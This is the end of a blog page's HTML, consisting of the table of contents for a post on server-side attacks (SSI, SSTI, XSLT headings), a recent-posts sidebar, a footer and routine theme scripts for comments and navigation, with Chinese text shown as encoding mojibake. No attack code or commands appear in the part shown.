href="#SSI-Injection-Exploitation-Example"><span class="toc-number">4.2.</span> <span class="toc-text">SSI Injection Exploitation Example</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Date-%E6%97%A5%E6%9C%9F"><span class="toc-number">4.2.0.1.</span> <span class="toc-text">Date æ—¥æœŸ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#All-Variables"><span class="toc-number">4.2.0.2.</span> <span class="toc-text">All Variables</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">4.2.0.3.</span> <span class="toc-text">Reverse Shell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Edge-Side-Includes-ESI"><span class="toc-number">5.</span> <span class="toc-text">Edge-Side Includes (ESI)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ESI-Tags"><span class="toc-number">5.0.0.1.</span> <span class="toc-text">ESI Tags</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Template-Injections"><span class="toc-number">6.</span> <span class="toc-text">Server-Side Template Injections</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI%E6%A0%87%E8%AF%86"><span class="toc-number">6.1.</span> <span class="toc-text">SSTIæ ‡è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-1"><span class="toc-number">6.2.</span> <span class="toc-text">SSTI Exploitation Example 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py"><span class="toc-number">6.2.0.1.</span> <span class="toc-text">tplmap.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload"><span class="toc-number">6.2.0.2.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-cURL-%E4%B8%8E%E7%9B%AE%E6%A0%87%E4%BA%A4%E4%BA%92"><span class="toc-number">6.2.0.3.</span> <span class="toc-text">cURL - Interacting with the Target cURL -ä¸ç›®æ ‡äº¤äº’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-OS-Shell"><span class="toc-number">6.2.0.4.</span> <span class="toc-text">tplmap.py - OS Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-2"><span class="toc-number">6.3.</span> <span class="toc-text">SSTI Exploitation Example 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-7"><span class="toc-number">6.3.0.1.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-8"><span class="toc-number">6.3.0.2.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-9"><span class="toc-number">6.3.0.3.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-1"><span class="toc-number">6.3.0.4.</span> <span class="toc-text">tplmap.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI-Exploitation-Example-3"><span class="toc-number">6.4.</span> <span class="toc-text">SSTI Exploitation Example 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cURL-Interacting-with-the-Target-10"><span class="toc-number">6.4.0.1.</span> <span class="toc-text">cURL - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tplmap-py-2"><span class="toc-number">6.4.0.2.</span> <span class="toc-text">tplmap.py</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Primer-for-SSTI"><span class="toc-number">6.4.1.</span> <span class="toc-text">Python Primer for SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-3-Interpreter"><span class="toc-number">6.4.1.1.</span> <span class="toc-text">Python 3 Interpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-2"><span class="toc-number">6.4.1.2.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Payload-1"><span class="toc-number">6.4.1.3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl-Interacting-with-the-Target-3"><span class="toc-number">6.4.1.4.</span> <span class="toc-text">Curl - Interacting with the Target</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attacking-XSLT"><span class="toc-number">7.</span> <span class="toc-text">Attacking XSLT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Installation-of-required-packages"><span class="toc-number">7.0.0.1.</span> <span class="toc-text">Installation of required packages</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#catalogue-xml"><span class="toc-number">7.0.0.2.</span> <span class="toc-text">catalogue.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#transformation-xsl"><span class="toc-number">7.0.0.3.</span> <span class="toc-text">transformation.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformation-through-the-terminal"><span class="toc-number">7.0.0.4.</span> <span class="toc-text">Transformation through the terminal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#detection-xsl"><span class="toc-number">7.0.0.5.</span> <span class="toc-text">detection.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Transformation-through-the-terminal-1"><span class="toc-number">7.0.0.6.</span> <span class="toc-text">Transformation through the terminal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#readfile-xsl"><span class="toc-number">7.0.0.7.</span> <span class="toc-text">readfile.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2"><span class="toc-number">7.0.0.8.</span> <span class="toc-text">é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssrf-xsl"><span class="toc-number">7.0.0.9.</span> <span class="toc-text">ssrf.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2-1"><span class="toc-number">7.0.0.10.</span> <span class="toc-text">é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fingerprinting-xsl"><span class="toc-number">7.0.0.11.</span> <span class="toc-text">fingerprinting.xsl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BB%88%E7%AB%AF%E8%BF%9B%E8%A1%8C%E8%BD%AC%E6%8D%A2-2"><span class="toc-number">7.0.0.12.</span> <span class="toc-text">é€šè¿‡ç»ˆç«¯è¿›è¡Œè½¬æ¢</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-Side-Attacks-Skills-Assessment"><span class="toc-number">8.</span> <span class="toc-text">Server-Side Attacks - Skills Assessment</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%83)%E4%B9%8BVulnHubDeathNote/" title="æ‰“é¶è®°å½•(ä¸€å…­ä¸ƒ)ä¹‹VulnHubDeathNote">æ‰“é¶è®°å½•(ä¸€å…­ä¸ƒ)ä¹‹VulnHubDeathNote</a><time datetime="2024-12-07T09:05:21.000Z" title="å‘è¡¨äº 2024-12-07 17:05:21">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E5%85%AD)%E4%B9%8BVulnHubVikings/" title="æ‰“é¶è®°å½•(ä¸€å…­å…­)ä¹‹VulnHubVikings">æ‰“é¶è®°å½•(ä¸€å…­å…­)ä¹‹VulnHubVikings</a><time datetime="2024-12-07T08:08:20.000Z" title="å‘è¡¨äº 2024-12-07 16:08:20">2024-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/24-11%E6%9D%82%E8%B0%88/" title="24-11æ‚è°ˆ">24-11æ‚è°ˆ</a><time datetime="2024-12-02T06:12:07.000Z" title="å‘è¡¨äº 2024-12-02 14:12:07">2024-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/02/2024%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWP(Web)/" title="2024ç¦å»ºçœæ•°æ®å®‰å…¨å¤§èµ›WP(Web)">2024ç¦å»ºçœæ•°æ®å®‰å…¨å¤§èµ›WP(Web)</a><time datetime="2024-12-01T16:11:19.000Z" title="å‘è¡¨äº 2024-12-02 00:11:19">2024-12-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/20/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%BA%94)%E4%B9%8BVulnTargetA/" title="æ‰“é¶è®°å½•(ä¸€å…­äº”)ä¹‹VulnTargetA">æ‰“é¶è®°å½•(ä¸€å…­äº”)ä¹‹VulnTargetA</a><time datetime="2024-11-20T15:31:29.000Z" title="å‘è¡¨äº 2024-11-20 23:31:29">2024-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç¹</button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="èŠå¤©"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="ç›´è¾¾è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2023/10/30/ServersideAttacksHTB/'
    this.page.identifier = '/2023/10/30/ServersideAttacksHTB/'
    this.page.title = 'ServersideAttacksHTB'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>